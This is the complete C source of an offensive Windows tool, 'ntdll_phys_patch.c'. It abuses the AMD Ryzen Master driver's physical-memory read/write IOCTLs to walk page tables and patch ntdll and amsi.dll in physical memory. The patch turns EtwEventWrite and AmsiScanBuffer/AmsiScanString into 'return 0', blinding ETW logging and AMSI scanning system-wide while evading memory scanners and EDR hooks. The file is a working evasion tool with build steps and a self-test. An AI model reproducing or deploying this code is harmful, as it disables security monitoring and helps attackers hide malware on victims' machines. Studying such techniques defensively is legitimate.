/*
 * ntdll_phys_patch.c — System-wide AMSI + ETW bypass via physical page patching
 *
 * ── Novel technique ──────────────────────────────────────────────────────────
 *
 *   Windows maps ntdll.dll and amsi.dll into every process from the SAME
 *   physical pages (shared read-only frames, copy-on-write on first write via
 *   normal virtual memory).  By using the AMD physical R/W driver to write
 *   directly to these physical frames we:
 *     • Bypass AMSI / ETW system-wide — all existing AND future processes
 *     • Never call VirtualProtect (no writable-code-page alert, no guard page)
 *     • Leave PTEs unchanged — memory scanners see read-only, unmodified pages
 *     • No kernel hooks, no SSDT/OB callback patching
 *     • Invisible to in-process hooks (e.g. MDE user-mode shims)
 *
 *   Targets:
 *     ntdll.dll!EtwEventWrite   → xor eax,eax; ret   suppress all ETW events
 *     amsi.dll!AmsiScanBuffer   → xor eax,eax; ret   return S_OK (result=0=CLEAN)
 *     amsi.dll!AmsiScanString   → xor eax,eax; ret
 *
 * ── How we locate the physical pages ────────────────────────────────────────
 *
 *   1. PML4 self-ref scan → kernel CR3 (immune to Win11 26200 EPROCESS false-
 *      positive where EPROCESS.DTB = kernel VA, not physical CR3).
 *   2. Scan physical RAM for System EPROCESS (PID=4, name="System",
 *      validated DTB bits-40+ = 0) to confirm kernel CR3 if PML4 scan fails.
 *   3. Walk ActiveProcessLinks from System EPROCESS to find own EPROCESS PA.
 *   4. Read own EPROCESS.Pcb.DirectoryTableBase (+0x028) = own process CR3.
 *      This is the per-process page table that maps BOTH user and kernel
 *      addresses; it is what the CPU loads on ring-3 → ring-3 context switches.
 *   5. Walk 4-level page tables under own process CR3 to find PA of each
 *      target function VA.
 *   6. Patch the physical frame.  The virtual address layer is untouched.
 *
 * ── Limitations ──────────────────────────────────────────────────────────────
 *
 *   • VBS/HVCI: hypervisor enforces write protection on code pages even at the
 *     physical level.  If HVCI is active the phys_write will silently fail.
 *     We detect this by reading back the patched bytes.
 *   • KPTI shadow CR3: on KPTI systems the CPU uses a separate "shadow" CR3
 *     for user mode that lacks kernel mappings.  However, EPROCESS.DTB still
 *     maps the full user address space (including ntdll), so our walk is valid.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function \
 *       -o ntdll_phys_patch.exe ntdll_phys_patch.c -lkernel32 -ladvapi32
 *
 * Requires: AMDRyzenMasterDriverV20, Admin.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

/* ══════════════════════════════════════════════════════════════════════════
 * §1  AMD DRIVER PRIMITIVES
 * ══════════════════════════════════════════════════════════════════════════ */

#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu

static HANDLE g_dev = INVALID_HANDLE_VALUE;

#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &h) != ERROR_SUCCESS) return;
    char vn[256]; DWORD vs, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0;; i++) {
        vs = sizeof vn; DWORD vd = 0;
        if (RegEnumValueA(h, i, vn, &vs, NULL, &type, NULL, &vd) == ERROR_NO_MORE_ITEMS) break;
        if ((type != 3 && type != 8) || vd < 20) continue;
        buf = malloc(vd); if (!buf) continue;
        if (RegQueryValueExA(h, vn, NULL, NULL, buf, &vd) == ERROR_SUCCESS) { sz = vd; break; }
        free(buf); buf = NULL;
    }
    RegCloseKey(h);
    if (!buf || sz < 20) { free(buf); return; }
    DWORD cnt = *(DWORD*)(buf + 16); uint8_t *p = buf + 20;
    for (DWORD i = 0; i < cnt && g_nranges < MAX_RANGES; i++, p += 20) {
        g_ranges[g_nranges].base = *(uint64_t*)(p + 4);
        g_ranges[g_nranges].size = *(uint64_t*)(p + 12);
        g_nranges++;
    }
    free(buf);
}

static int in_range(uint64_t pa, uint32_t len)
{
    for (int i = 0; i < g_nranges; i++)
        if (pa >= g_ranges[i].base && pa + len <= g_ranges[i].base + g_ranges[i].size)
            return 1;
    return 0;
}

static int open_dev(void)
{
    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ|GENERIC_WRITE,
                        FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    return g_dev != INVALID_HANDLE_VALUE;
}
static void close_dev(void) { if (g_dev != INVALID_HANDLE_VALUE) CloseHandle(g_dev); }

static int phys_read(uint64_t pa, void *buf, uint32_t len)
{
    if (!in_range(pa, len)) return 0;
    uint8_t ib[12]; *(uint64_t*)ib = pa; *(uint32_t*)(ib+8) = len;
    uint8_t *ob = malloc(12 + len); if (!ob) return 0;
    DWORD r = 0;
    int ok = DeviceIoControl(g_dev, IOCTL_PHYS_READ, ib, 12, ob, 12+len, &r, NULL);
    if (ok) memcpy(buf, ob+12, len);
    free(ob); return ok;
}

static int phys_write(uint64_t pa, const void *buf, uint32_t len)
{
    if (!in_range(pa, len)) return 0;
    uint8_t *ib = malloc(12+len); if (!ib) return 0;
    *(uint64_t*)ib = pa; *(uint32_t*)(ib+8) = len;
    memcpy(ib+12, buf, len);
    DWORD r = 0;
    int ok = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE, ib, 12+len, NULL, 0, &r, NULL);
    free(ib); return ok;
}

static uint64_t phys_read64(uint64_t pa) { uint64_t v=0; phys_read(pa,&v,8); return v; }

/* ══════════════════════════════════════════════════════════════════════════
 * §2  KERNEL CR3 — PML4 SELF-REF SCAN
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t g_kernel_cr3 = 0;

static uint64_t find_kernel_cr3(uint64_t nt_va)
{
    uint32_t nt_idx = nt_va ? (uint32_t)((nt_va >> 39) & 0x1FF) : 0;
    static uint8_t pg[4096];

    /* Pass 1: classic self-ref slot 0x1ED, first 256MB */
    for (int ri = 0; ri < g_nranges; ri++) {
        if (g_ranges[ri].base >= 0x10000000ULL) continue;
        uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
        if (re > 0x10000000ULL) re = 0x10000000ULL;
        for (uint64_t pa = g_ranges[ri].base; pa < re; pa += 0x1000) {
            if (!phys_read(pa, pg, 4096)) continue;
            uint64_t e = *(uint64_t*)(pg + 0x1ED * 8);
            if (!((e & 1) && (e & 0x000FFFFFFFFFF000ULL) == pa)) continue;
            if (nt_idx) {
                uint64_t ke = *(uint64_t*)(pg + nt_idx * 8);
                if (!(ke & 1)) continue;
            }
            return pa;
        }
    }

    /* Pass 2: randomised self-ref slot 0x100-0x1FF, first 64MB */
    for (int ri = 0; ri < g_nranges; ri++) {
        if (g_ranges[ri].base >= 0x4000000ULL) continue;
        uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
        if (re > 0x4000000ULL) re = 0x4000000ULL;
        for (uint64_t pa = g_ranges[ri].base; pa < re; pa += 0x1000) {
            if (!phys_read(pa, pg, 4096)) continue;
            for (int idx = 0x100; idx < 0x200; idx++) {
                uint64_t e = *(uint64_t*)(pg + idx * 8);
                if (!(e & 1) || (e & 0x000FFFFFFFFFF000ULL) != pa) continue;
                if (nt_idx) {
                    uint64_t ke = *(uint64_t*)(pg + nt_idx * 8);
                    if (!(ke & 1)) continue;
                }
                return pa;
            }
        }
    }

    if (nt_va) return find_kernel_cr3(0);
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §3  KERNEL KVA → PA WALK (uses kernel CR3)
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t kva_to_pa(uint64_t va)
{
    if (!g_kernel_cr3) return 0;
    uint64_t e = phys_read64((g_kernel_cr3 & ~0xFFFULL) + ((va>>39)&0x1FF)*8);
    if (!(e&1)) return 0;
    e = phys_read64((e & 0x000FFFFFFFFFF000ULL) + ((va>>30)&0x1FF)*8);
    if (!(e&1)) return 0;
    if (e & (1ULL<<7)) return (e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
    e = phys_read64((e & 0x000FFFFFFFFFF000ULL) + ((va>>21)&0x1FF)*8);
    if (!(e&1)) return 0;
    if (e & (1ULL<<7)) return (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
    e = phys_read64((e & 0x000FFFFFFFFFF000ULL) + ((va>>12)&0x1FF)*8);
    if (!(e&1)) return 0;
    return (e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

/* ══════════════════════════════════════════════════════════════════════════
 * §4  PROCESS VA → PA WALK (uses per-process CR3)
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t pva_to_pa(uint64_t proc_cr3, uint64_t va)
{
    uint64_t e = phys_read64((proc_cr3 & ~0xFFFULL) + ((va>>39)&0x1FF)*8);
    if (!(e&1)) return 0;
    e = phys_read64((e & 0x000FFFFFFFFFF000ULL) + ((va>>30)&0x1FF)*8);
    if (!(e&1)) return 0;
    if (e & (1ULL<<7)) return (e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
    e = phys_read64((e & 0x000FFFFFFFFFF000ULL) + ((va>>21)&0x1FF)*8);
    if (!(e&1)) return 0;
    if (e & (1ULL<<7)) return (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
    e = phys_read64((e & 0x000FFFFFFFFFF000ULL) + ((va>>12)&0x1FF)*8);
    if (!(e&1)) return 0;
    return (e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

/* ══════════════════════════════════════════════════════════════════════════
 * §5  SYSTEM EPROCESS SCAN + OWN EPROCESS FIND
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t find_system_eproc_pa(void)
{
    static const uint32_t noffs[] = { 0x5A8, 0x5B8, 0x5B0, 0x5C0 };
    for (int r = 0; r < g_nranges; r++) {
        uint64_t base = (g_ranges[r].base + 7) & ~7ULL;
        uint64_t end  = g_ranges[r].base + g_ranges[r].size;
        for (uint64_t pa = base; pa + 0xA00 < end; pa += 8) {
            uint32_t pid = 0;
            if (!phys_read(pa + 0x440, &pid, 4)) continue;
            if (pid != 4) continue;
            for (int n = 0; n < 4; n++) {
                char nm[8];
                if (!phys_read(pa + noffs[n], nm, 8)) continue;
                if (memcmp(nm, "System\0\0", 8)) continue;
                uint64_t dtb = phys_read64(pa + 0x028);
                /* Physical CR3: page-aligned, >64KB, bits 40+ must be zero */
                if (!dtb || (dtb & 0xFFF) || dtb < 0x10000 || (dtb >> 40)) continue;
                uint64_t flink = phys_read64(pa + 0x448);
                uint64_t blink = phys_read64(pa + 0x450);
                if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL) continue;
                return pa;
            }
        }
    }
    return 0;
}

/* Walk ActiveProcessLinks from system_pa to find our own EPROCESS by PID */
static uint64_t find_own_eproc_pa(uint64_t system_pa)
{
    DWORD own_pid = GetCurrentProcessId();
    uint64_t flink_va = phys_read64(system_pa + 0x448);
    if (!flink_va) return 0;
    uint64_t flink_pa = kva_to_pa(flink_va);
    if (!flink_pa) return 0;

    /* Reconstruct System EPROCESS VA from blink of first entry */
    uint64_t blink_va = phys_read64(flink_pa + 8);
    if (!blink_va) return 0;
    uint64_t sys_va = blink_va - 0x448;

    uint64_t cur_va = sys_va;
    for (int i = 0; i < 1024; i++) {
        uint64_t cur_pa = kva_to_pa(cur_va);
        if (!cur_pa) break;
        uint32_t p = 0; phys_read(cur_pa + 0x440, &p, 4);
        if (p == own_pid) return cur_pa;
        uint64_t next_flink = phys_read64(cur_pa + 0x448);
        if (!next_flink || next_flink == flink_va) break;
        cur_va = next_flink - 0x448;
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §6  PE EXPORT RESOLVER
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t get_proc_rva(HMODULE mod, const char *name)
{
    uint8_t *base = (uint8_t*)mod;
    uint32_t pe_off = *(uint32_t*)(base + 0x3C);
    uint8_t *pe     = base + pe_off;
    uint32_t exp_rva = *(uint32_t*)(pe + 0x88); /* OptHdr + 0x70 data dir [0].rva */
    if (!exp_rva) return 0;
    uint8_t *exp = base + exp_rva;
    uint32_t n_names   = *(uint32_t*)(exp + 0x18);
    uint32_t *names    = (uint32_t*)(base + *(uint32_t*)(exp + 0x20));
    uint16_t *ordinals = (uint16_t*)(base + *(uint32_t*)(exp + 0x24));
    uint32_t *funcs    = (uint32_t*)(base + *(uint32_t*)(exp + 0x1C));
    for (uint32_t i = 0; i < n_names; i++) {
        if (!strcmp((char*)(base + names[i]), name))
            return (uint64_t)funcs[ordinals[i]];
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §7  PATCH RECORD
 * ══════════════════════════════════════════════════════════════════════════ */

#define PATCH_BYTES 3
#define SAVE_BYTES  16

typedef struct {
    const char *mod;
    const char *fn;
    uint64_t    va;
    uint64_t    pa;
    uint8_t     orig[SAVE_BYTES];
    int         applied;
} Patch;

/* Patch: xor eax,eax (31 C0); ret (C3) = return 0/S_OK */
static const uint8_t STUB_RET0[PATCH_BYTES] = { 0x31, 0xC0, 0xC3 };

static int apply_patch(Patch *p, uint64_t proc_cr3)
{
    if (!p->va) return 0;
    p->pa = pva_to_pa(proc_cr3, p->va);
    if (!p->pa) {
        printf("  [!] %s!%s — VA %016"PRIx64" → PA failed\n",
               p->mod, p->fn, p->va);
        return 0;
    }
    if (!phys_read(p->pa, p->orig, SAVE_BYTES)) {
        printf("  [!] %s!%s — read PA %016"PRIx64" failed\n",
               p->mod, p->fn, p->pa);
        return 0;
    }
    /* Write patch */
    if (!phys_write(p->pa, STUB_RET0, PATCH_BYTES)) {
        printf("  [!] %s!%s — phys_write PA %016"PRIx64" failed\n",
               p->mod, p->fn, p->pa);
        return 0;
    }
    /* Read back to verify (HVCI would silently block the write) */
    uint8_t verify[PATCH_BYTES];
    phys_read(p->pa, verify, PATCH_BYTES);
    if (memcmp(verify, STUB_RET0, PATCH_BYTES) != 0) {
        printf("  [!] %s!%s — verify FAILED (HVCI/WP may be active)\n",
               p->mod, p->fn);
        return 0;
    }
    p->applied = 1;
    printf("  [+] PATCHED %s!%s  VA=%016"PRIx64"  PA=%016"PRIx64"\n",
           p->mod, p->fn, p->va, p->pa);
    printf("      orig: "); for (int i=0;i<8;i++) printf("%02X ", p->orig[i]); printf("...\n");
    return 1;
}

static void restore_patch(Patch *p)
{
    if (!p->applied || !p->pa) return;
    phys_write(p->pa, p->orig, SAVE_BYTES);
    p->applied = 0;
    printf("  [~] Restored %s!%s\n", p->mod, p->fn);
}

/* ══════════════════════════════════════════════════════════════════════════
 * §8  NTOSKRNL VA (for PML4 validation)
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t get_ntoskrnl_va(void)
{
    typedef NTSTATUS (WINAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
    NtQSI_t fn = (NtQSI_t)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                          "NtQuerySystemInformation");
    if (!fn) return 0;
    typedef struct {
        HANDLE S; PVOID MB, IB; ULONG IS, F;
        USHORT L, I, Lc, O; CHAR P[256];
    } MOD;
    typedef struct { ULONG C; MOD M[1]; } ML;
    ULONG sz = 0x40000; ML *ml = NULL; NTSTATUS st;
    do {
        free(ml); ml = malloc(sz *= 2);
        if (!ml) return 0;
        st = fn(11, ml, sz, NULL);
    } while (st == (NTSTATUS)0xC0000004L);
    uint64_t va = (st == 0) ? (uint64_t)ml->M[0].IB : 0;
    free(ml); return va;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §9  HVCI / VBS DETECTION
 * ══════════════════════════════════════════════════════════════════════════ */

static int hvci_check(void)
{
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity",
            0, KEY_READ, &h) != ERROR_SUCCESS) return 0;
    DWORD val = 0, sz = sizeof val;
    RegQueryValueExA(h, "Enabled", NULL, NULL, (BYTE*)&val, &sz);
    RegCloseKey(h);
    return (val != 0);
}

/* ══════════════════════════════════════════════════════════════════════════
 * §10  GLOBAL PATCH TABLE + CTRL-C RESTORE
 * ══════════════════════════════════════════════════════════════════════════ */

static Patch g_patches[8];
static int   g_npatches = 0;

static BOOL WINAPI ctrl_handler(DWORD t)
{
    (void)t;
    puts("\n[!] Interrupted — restoring patches");
    for (int i = 0; i < g_npatches; i++) restore_patch(&g_patches[i]);
    close_dev();
    ExitProcess(1);
    return TRUE;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §11  MAIN
 * ══════════════════════════════════════════════════════════════════════════ */

int main(void)
{
    puts("=== ntdll_phys_patch: system-wide AMSI+ETW bypass via physical page patch ===");

    /* HVCI check */
    if (hvci_check()) {
        puts("[!] WARNING: HVCI appears enabled — physical code page writes may be silently blocked.");
        puts("[!] Continuing anyway (will verify via read-back).");
    }

    if (!open_dev()) { fputs("[-] Cannot open AMD device\n", stderr); return 1; }
    load_ranges();
    if (!g_nranges) { puts("[-] No physical ranges"); close_dev(); return 1; }

    SetConsoleCtrlHandler(ctrl_handler, TRUE);

    /* Get ntoskrnl VA for PML4 validation */
    uint64_t nt_va = get_ntoskrnl_va();
    printf("[+] ntoskrnl VA: %016"PRIx64"\n", nt_va);

    /* Kernel CR3 via PML4 self-ref scan */
    g_kernel_cr3 = find_kernel_cr3(nt_va);
    if (g_kernel_cr3) {
        printf("[+] Kernel CR3 (PML4 scan): %016"PRIx64"\n", g_kernel_cr3);
    } else {
        puts("[-] PML4 scan failed");
        close_dev(); return 1;
    }

    /* Find System EPROCESS */
    uint64_t sys_pa = find_system_eproc_pa();
    if (!sys_pa) { puts("[-] System EPROCESS not found"); close_dev(); return 1; }
    printf("[+] System EPROCESS PA: %016"PRIx64"\n", sys_pa);

    /* Find own EPROCESS */
    uint64_t own_pa = find_own_eproc_pa(sys_pa);
    if (!own_pa) { puts("[-] Own EPROCESS not found"); close_dev(); return 1; }
    printf("[+] Own EPROCESS PA:    %016"PRIx64" (PID %lu)\n",
           own_pa, (unsigned long)GetCurrentProcessId());

    /* Read own process CR3 — this maps our user-mode VA space */
    uint64_t proc_cr3 = phys_read64(own_pa + 0x028);
    if (!proc_cr3 || (proc_cr3 & 0xFFF) || (proc_cr3 >> 40)) {
        printf("[-] Own EPROCESS.DTB invalid: %016"PRIx64"\n", proc_cr3);
        close_dev(); return 1;
    }
    printf("[+] Own process CR3:    %016"PRIx64"\n", proc_cr3);

    /* ── Locate target functions ──────────────────────────────────────── */

    /* ntdll.dll — always loaded */
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) { puts("[-] ntdll.dll not found"); close_dev(); return 1; }
    printf("[+] ntdll.dll base VA:  %016"PRIx64"\n", (uint64_t)ntdll);

    /* amsi.dll — load it explicitly (only loaded if AMSI is active) */
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi)
        puts("[~] amsi.dll not loaded — skipping AMSI patches");
    else
        printf("[+] amsi.dll base VA:   %016"PRIx64"\n", (uint64_t)amsi);

    /* Build patch list */
    static const struct { const char *mod; const char *fn; } targets[] = {
        { "ntdll.dll", "EtwEventWrite"    },
        { "ntdll.dll", "EtwEventWriteFull"},
        { "amsi.dll",  "AmsiScanBuffer"   },
        { "amsi.dll",  "AmsiScanString"   },
        { "amsi.dll",  "AmsiScanBufferEx" },
    };
    static const int NTARGETS = (int)(sizeof targets / sizeof targets[0]);

    for (int i = 0; i < NTARGETS && g_npatches < 8; i++) {
        HMODULE mod = GetModuleHandleA(targets[i].mod);
        if (!mod) continue;
        uint64_t rva = get_proc_rva(mod, targets[i].fn);
        if (!rva) {
            printf("[~] %s!%s not found (export may not exist on this build)\n",
                   targets[i].mod, targets[i].fn);
            continue;
        }
        uint64_t va = (uint64_t)mod + rva;
        printf("[*] %s!%s VA = %016"PRIx64"\n", targets[i].mod, targets[i].fn, va);

        Patch *p = &g_patches[g_npatches++];
        p->mod     = targets[i].mod;
        p->fn      = targets[i].fn;
        p->va      = va;
        p->pa      = 0;
        p->applied = 0;
        memset(p->orig, 0, SAVE_BYTES);
    }

    if (g_npatches == 0) {
        puts("[-] No patch targets found");
        close_dev(); return 1;
    }

    /* ── Apply all patches ────────────────────────────────────────────── */

    puts("\n[*] Applying patches...");
    int n_ok = 0;
    for (int i = 0; i < g_npatches; i++)
        if (apply_patch(&g_patches[i], proc_cr3)) n_ok++;

    printf("\n[+] %d/%d patches applied\n", n_ok, g_npatches);

    if (n_ok == 0) {
        puts("[-] No patches applied — check HVCI status or driver access");
        close_dev(); return 1;
    }

    /* ── Functional test ─────────────────────────────────────────────── */

    puts("\n[*] Functional test:");

    /* ETW: call EtwEventWrite and verify no crash */
    typedef ULONG (NTAPI *EtwWrite_t)(void*, void*, ULONG, void*);
    EtwWrite_t EtwWrite = (EtwWrite_t)GetProcAddress(ntdll, "EtwEventWrite");
    if (EtwWrite) {
        puts("  [*] Calling EtwEventWrite(NULL, NULL, 0, NULL) — should return 0...");
        ULONG r = EtwWrite(NULL, NULL, 0, NULL);
        printf("  [+] EtwEventWrite returned 0x%08lX %s\n",
               (unsigned long)r, r == 0 ? "(S_OK — patch active)" : "(unexpected)");
    }

    /* AMSI: call AmsiScanBuffer via runtime import */
    if (amsi) {
        typedef HRESULT (WINAPI *AmsiScan_t)(PVOID, PVOID, ULONG, LPCWSTR, PVOID, PVOID*);
        AmsiScan_t AmsiScan = (AmsiScan_t)GetProcAddress(amsi, "AmsiScanBuffer");
        if (AmsiScan) {
            PVOID result = NULL;
            const char *test_payload = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR";
            puts("  [*] Calling AmsiScanBuffer(EICAR string)...");
            HRESULT hr = AmsiScan(NULL, (PVOID)test_payload,
                                  (ULONG)strlen(test_payload), L"test", NULL, &result);
            printf("  [+] AmsiScanBuffer returned 0x%08lX result=%p %s\n",
                   (unsigned long)hr, result,
                   (hr == S_OK && !result) ? "(CLEAN — patch active)" : "(check manually)");
        }
    }

    /* ── Wait, then restore ───────────────────────────────────────────── */

    puts("\n[*] Patches active. Press ENTER to restore and exit...");
    (void)getchar();

    puts("\n[*] Restoring original bytes...");
    for (int i = 0; i < g_npatches; i++) restore_patch(&g_patches[i]);
    puts("[+] All patches restored.");

    close_dev();
    return 0;
}
